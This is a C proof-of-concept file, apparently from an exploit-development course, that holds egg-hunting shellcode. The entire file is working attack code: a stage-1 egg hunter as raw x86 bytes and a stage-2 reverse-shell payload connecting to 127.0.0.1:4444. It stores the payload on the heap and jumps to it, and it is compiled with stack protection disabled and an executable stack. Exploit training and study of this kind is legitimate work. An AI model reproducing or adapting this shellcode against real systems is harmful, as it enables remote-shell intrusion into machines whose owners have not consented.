/* Proof of concept code for Egg Hunting shellcode */
/* Author: Ty Gast // SLAE-1461 */
/* This PoC will use heap memory to store the "egg" */
/* Compile with: gcc -fno-stack-protector -z execstack */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* Stage 1: egg hunting code */
unsigned char code[] = \
"\x31\xc9\x31\xdb\xf7\xe3\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\x89\xd7\xb8\xca\x11\xab\x1e\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

/* Stage 2: reverse shell to 127.0.0.1:4444 */
unsigned char stage2[] = \
"\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66\xcd\x80\x89\xc3\x89\xd9\x49\xb0\x3f\xcd\x80\x49\x79\xf9\x89\xde\x5b\x43\x5a\xc1\xe2\x04\x68\x7f\x00\x00\x01\x66\xb8\x11\x5c\xc1\xe0\x10\xb0\x02\x50\x89\xe1\x52\x51\x56\x89\xe1\x31\xc0\xb0\x66\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

/* Half of the mark value */
unsigned char halfmark[] = "\xca\x11\xab\x1e";

main() {
  void *stage2mem;

  printf("Shellcode length: %d\n", strlen(code));

  /* Allocate memory on the heap, copy the mark twice,
     followed by the stage 2 shellcode */
  stage2mem = malloc(256);
  memcpy(stage2mem, halfmark, 4);
  memcpy(stage2mem + 4, halfmark, 4);
  memcpy(stage2mem + 8, stage2, 248);

  int (*ret)() = (int(*)())code;

  ret();
}
